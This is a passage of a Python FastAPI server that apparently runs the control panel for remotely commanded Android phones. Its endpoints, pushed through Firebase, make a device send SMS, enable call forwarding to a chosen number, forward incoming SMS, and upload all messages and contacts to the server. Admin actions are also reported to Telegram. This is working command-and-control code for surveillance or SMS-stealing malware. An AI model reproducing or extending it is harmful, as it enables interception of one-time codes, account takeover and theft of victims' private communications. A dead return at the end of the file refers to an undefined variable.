    if is_ping_command and ping_type == "firebase":
        params = {k: v for k, v in (command_request.parameters or {}).items() if k != "type"}
        
        result = await firebase_service.send_command_to_device(
            device_id,
            "ping",
            params if params else None
        )

        if not result["success"]:
            raise HTTPException(status_code=400, detail=result["message"])

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Sent Firebase ping to device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "ping", "type": "firebase", "result": result}
        )

        await device_service.add_log(device_id, "command", "Firebase ping sent", "info")
        
        await telegram_multi_service.notify_command_sent(
            current_admin.username, device_id, "ping (firebase)"
        )

        return {
            "success": True,
            "message": f"Firebase ping sent: {result['message']}",
            "type": "firebase",
            "result": result
        }

    if command_request.command == "send_sms":
        phone = command_request.parameters.get("phone")
        message = command_request.parameters.get("message")
        sim_slot = command_request.parameters.get("simSlot", 0)

        if not phone or not message:
            raise HTTPException(status_code=400, detail="Phone and message are required")

        result = await firebase_service.send_sms(
            device_id=device_id,
            phone=phone,
            message=message,
            sim_slot=int(sim_slot)
        )

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Sent SMS command to device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "send_sms", "phone": phone, "sim_slot": sim_slot}
        )

        await device_service.add_log(
            device_id, "command", f"SMS command sent to {phone}", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "call_forwarding":
        forward_number = command_request.parameters.get("number")
        sim_slot = command_request.parameters.get("simSlot", 0)

        if not forward_number:
            raise HTTPException(status_code=400, detail="Forward number is required")

        result = await firebase_service.enable_call_forwarding(
            device_id=device_id,
            forward_number=forward_number,
            sim_slot=int(sim_slot)
        )

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Enabled call forwarding on device: {device_id} to {forward_number}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "call_forwarding", "number": forward_number, "sim_slot": sim_slot}
        )

        await device_service.add_log(
            device_id, "command", f"Call forwarding enabled to {forward_number}", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "call_forwarding_disable":
        sim_slot = command_request.parameters.get("simSlot", 0)

        result = await firebase_service.disable_call_forwarding(
            device_id=device_id,
            sim_slot=int(sim_slot)
        )

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Disabled call forwarding on device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "call_forwarding_disable", "sim_slot": sim_slot}
        )

        await device_service.add_log(
            device_id, "command", "Call forwarding disabled", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "quick_upload_sms":
        result = await firebase_service.quick_upload_sms(device_id)

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Requested quick SMS upload from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "quick_upload_sms"}
        )

        await device_service.add_log(
            device_id, "command", "Quick SMS upload requested", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "quick_upload_contacts":
        result = await firebase_service.quick_upload_contacts(device_id)

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Requested quick contacts upload from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "quick_upload_contacts"}
        )

        await device_service.add_log(
            device_id, "command", "Quick contacts upload requested", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "upload_all_sms":
        result = await firebase_service.upload_all_sms(device_id)

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Requested full SMS upload from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "upload_all_sms"}
        )

        await device_service.add_log(
            device_id, "command", "Full SMS upload requested", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    if command_request.command == "upload_all_contacts":
        result = await firebase_service.upload_all_contacts(device_id)

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Requested full contacts upload from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "upload_all_contacts"}
        )

        await device_service.add_log(
            device_id, "command", "Full contacts upload requested", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    else:
        raise HTTPException(
            status_code=400, 
            detail=f"Unknown command: {command_request.command}"
        )

@app.put("/api/devices/{device_id}/settings")
async def update_device_settings(
    device_id: str,
    settings_request: UpdateSettingsRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.CHANGE_SETTINGS))
):
    
    device = await device_service.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    settings_dict = settings_request.model_dump(exclude_unset=True)
    await device_service.update_device_settings(device_id, settings_dict)

    if manager.is_connected(device_id):
        if "sms_forward_enabled" in settings_dict:
            await manager.send_command(
                device_id,
                "toggle_forward",
                {"enabled": settings_dict["sms_forward_enabled"]}
            )

        if "forward_number" in settings_dict:
            await manager.send_command(
                device_id,
                "change_forward_number",
                {"number": settings_dict["forward_number"]}
            )

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.CHANGE_SETTINGS,
        description=f"Changed settings for device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id,
        metadata={"changes": settings_dict}
    )

    try:
        await telegram_multi_service.notify_admin_action(
            current_admin.username,
            "Settings Changed",
            f"Device: {device_id}, Changes: {', '.join(settings_dict.keys())}"
        )
    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise

    await device_service.add_log(device_id, "settings", "Settings updated", "info", settings_dict)

    return {
        "success": True,
        "message": "Settings updated successfully"
    }

@app.delete("/api/devices/{device_id}/sms")
async def delete_device_sms(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
):
    
    result = await mongodb.db.sms_messages.delete_many({"device_id": device_id})

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.DELETE_DATA,
        description=f"Deleted {result.deleted_count} SMS from device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id,
        metadata={"type": "sms", "count": result.deleted_count}
    )

    try:
        await telegram_multi_service.notify_admin_action(
            current_admin.username,
            "Data Deleted",
            f"Deleted {result.deleted_count} SMS messages from device {device_id}"
        )
    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise

    return {
        "success": True,
        "deleted_count": result.deleted_count
    }

@app.get("/api/devices/{device_id}/calls")
async def get_device_calls(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    
    try:
        calls_cursor = mongodb.db.call_logs.find(
            {"device_id": device_id}
        ).sort("timestamp", -1).skip(skip).limit(limit)

        calls = await calls_cursor.to_list(length=limit)
        total = await mongodb.db.call_logs.count_documents({"device_id": device_id})

        formatted_calls = []
        for call in calls:
            formatted_calls.append({
                "call_id": call.get("call_id"),
                "device_id": call.get("device_id"),
                "number": call.get("number", ""),
                "name": call.get("name", "Unknown"),
                "call_type": call.get("call_type", "unknown"),
                "timestamp": call.get("timestamp").isoformat() if isinstance(call.get("timestamp"), datetime) else datetime.utcnow().isoformat(),
                "duration": call.get("duration", 0),
                "duration_formatted": call.get("duration_formatted", "0s"),
                "received_at": call.get("received_at").isoformat() if isinstance(call.get("received_at"), datetime) else None
            })

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.VIEW_DEVICE,
            description=f"Viewed call logs for device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"count": len(formatted_calls)}
        )

        return {
            "calls": formatted_calls,
            "total": total,
            "page": skip // limit + 1,
            "page_size": limit
        }

    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))

    return {
        "call_logs": call_logs,
        "total": total,
        "page": skip // limit + 1,
        "page_size": limit
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "app.main:app",
        host=settings.SERVER_HOST,
        port=settings.SERVER_PORT,
        reload=settings.DEBUG,
        log_level="info"
    )